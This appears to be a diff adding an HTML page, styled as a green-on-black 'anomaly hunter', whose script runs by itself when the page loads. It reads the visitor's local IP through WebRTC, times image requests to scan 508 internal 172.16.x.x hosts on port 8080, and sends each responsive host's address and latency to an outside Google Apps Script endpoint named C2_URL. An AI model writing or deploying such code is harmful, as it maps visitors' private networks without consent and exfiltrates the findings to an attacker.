@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Adaptive Anomaly Hunter // Dual-Subnet</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .success { border: 2px solid #0f0; padding: 15px; margin: 20px 0; background: #002200; }
+        .stat-box { border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; color: #888; }
+        .highlight { color: #fff; font-weight: bold; }
+        .sub-info { font-size: 11px; color: #555; }
+        #progress-bar { width: 100%; background: #111; height: 10px; margin-top: 5px; }
+        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.2s; }
+    </style>
+</head>
+<body>
+    <h1>// ADAPTIVE ANOMALY HUNTER [172.16.x.x] //</h1>
+    
+    <div class="stat-box">
+        <div>LOCAL NODE: <span id="sys-status" class="highlight">Detecting...</span></div>
+        <div>TARGET SCOPE: <span class="highlight">172.16.0.0/24 & 172.16.1.0/24</span></div>
+    </div>
+
+    <div id="scanner-hud">
+        <div class="stat-box">
+            <div>STATUS: <span id="scan-status" class="highlight">Initializing...</span></div>
+            <div>BASELINE: <span id="median">Calculating...</span></div>
+            <div>PROGRESS: <span id="progress-text">0/508</span></div>
+            <div id="progress-bar"><div id="progress-fill"></div></div>
+        </div>
+        <div id="results"></div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
+        var TARGET_PORT = 8080;
+        var TIMEOUT_LIMIT = 200; // Hard stop for dead hosts
+        var CONCURRENCY = 20;    // Increased slightly for the larger range
+        
+        // --- TARGET GENERATION (172.16.0.x and 172.16.1.x) ---
+        var queue = [];
+        var subnets = [0, 1]; // The third octets we want to scan
+        
+        subnets.forEach(function(subnet) {
+            for(var i=1; i<255; i++) {
+                queue.push("172.16." + subnet + "." + i);
+            }
+        });
+
+        var totalTargets = queue.length;
+        var results = []; 
+
+        // --- PHASE 1: OPTIONAL LOCAL IP CHECK (Information Only) ---
+        async function checkLocalIP() {
+            var pc = new RTCPeerConnection({iceServers: []});
+            pc.createDataChannel('');
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            
+            pc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                if(myIP) {
+                    document.getElementById('sys-status').innerText = myIP[1];
+                    pc.close();
+                }
+            };
+        }
+        checkLocalIP(); // Fire and forget
+
+        // --- PHASE 2: SCANNER ENGINE ---
+
+        function calculateMedian(values) {
+            if(values.length === 0) return 0;
+            values.sort((a,b) => a-b);
+            var half = Math.floor(values.length / 2);
+            return values[half];
+        }
+
+        function analyzeAndReport() {
+            // 1. Calculate Baseline
+            var times = results.map(r => r.time);
+            var median = calculateMedian(times);
+            
+            document.getElementById('median').innerText = median + "ms";
+            document.getElementById('scan-status').innerText = "Analyzing Deviations...";
+
+            // 2. Find Anomalies (Look for IPs significantly faster than the median)
+            // We use a looser threshold here since we are scanning two subnets
+            var anomalies = results.filter(r => (median - r.time) > 100); 
+
+            if(anomalies.length > 0) {
+                var html = "<div class='success'><h2>ANOMALIES DETECTED: " + anomalies.length + "</h2>";
+                
+                anomalies.forEach(a => {
+                    html += "<p><strong>" + a.ip + "</strong>: " + a.time + "ms (Deviation: " + (median - a.time) + "ms)</p>";
+                    
+                    // Exfil each hit
+                    fetch(C2_URL, {
+                        method: "POST", mode: "no-cors",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({
+                            timestamp: new Date().toISOString(),
+                            type: "ANOMALY_CONFIRMED",
+                            target_ip: a.ip,
+                            latency: a.time,
+                            baseline: median
+                        })
+                    });
+                });
+                html += "</div>";
+                document.getElementById('results').innerHTML = html;
+            } else {
+                document.getElementById('scan-status').innerText = "SCAN COMPLETE. NO TARGETS FOUND.";
+            }
+        }
+
+        function scan(ip) {
+            return new Promise(resolve => {
+                var start = performance.now();
+                var img = new Image();
+                var isDone = false;
+
+                var finish = function() {
+                    if(isDone) return;
+                    isDone = true;
+                    var duration = Math.round(performance.now() - start);
+                    results.push({ip: ip, time: duration});
+                    
+                    // Update UI
+                    var progress = results.length;
+                    document.getElementById('progress-text').innerText = progress + "/" + totalTargets;
+                    document.getElementById('progress-fill').style.width = ((progress / totalTargets) * 100) + "%";
+                    
+                    resolve();
+                };
+
+                img.onload = finish;
+                img.onerror = finish; 
+
+                // Timeout Handler
+                setTimeout(function() {
+                    if(!isDone) {
+                        img.src = ""; 
+                        results.push({ip: ip, time: TIMEOUT_LIMIT});
+                        isDone = true;
+                        
+                        // Update UI
+                        var progress = results.length;
+                        document.getElementById('progress-text').innerText = progress + "/" + totalTargets;
+                        document.getElementById('progress-fill').style.width = ((progress / totalTargets) * 100) + "%";
+                        
+                        resolve();
+                    }
+                }, TIMEOUT_LIMIT);
+
+                // The Cache Busting Request
+                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
+            });
+        }
+
+        async function runBatch() {
+            document.getElementById('scan-status').innerText = "Scanning Subnets (0.x & 1.x)...";
+            
+            while(queue.length > 0) {
+                var batch = [];
+                // Process in chunks of CONCURRENCY
+                for(var i=0; i<CONCURRENCY && queue.length > 0; i++) {
+                    batch.push(scan(queue.shift()));
+                }
+                await Promise.all(batch);
+            }
+            analyzeAndReport();
+        }
+
+        // Auto-start
+        setTimeout(runBatch, 1000); 
+
+    </script>
+</body>
+</html>
